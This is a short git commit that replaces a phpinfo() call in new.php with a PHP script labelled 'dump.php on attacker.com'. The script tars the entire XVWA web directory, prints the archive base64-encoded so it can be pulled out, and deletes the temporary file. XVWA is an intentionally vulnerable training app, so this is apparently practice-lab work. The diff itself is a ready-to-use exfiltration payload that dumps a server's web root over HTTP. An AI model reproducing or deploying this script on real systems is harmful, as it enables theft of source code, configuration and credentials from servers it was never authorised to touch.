5edc8604906398a598a5aedefa09f5ac9cc3b60a
jaat301 <68196478+jaat301@users.noreply.github.com>
2025-05-04 22:20:26 +0530

    Update new.php

--- new.php
+++ new.php
@@ -1,3 +1,9 @@
 <?php
-phpinfo();
-?>
+// dump.php on attacker.com
+$src = 'C:/xampp/htdocs/xvwa';
+$tmp = sys_get_temp_dir() . '/all_xvwa.tar';
+// Create a tar.gz of the entire directory
+passthru("tar -czf $tmp $src");
+// Send it back base64-encoded
+echo base64_encode(file_get_contents($tmp));
+unlink($tmp);
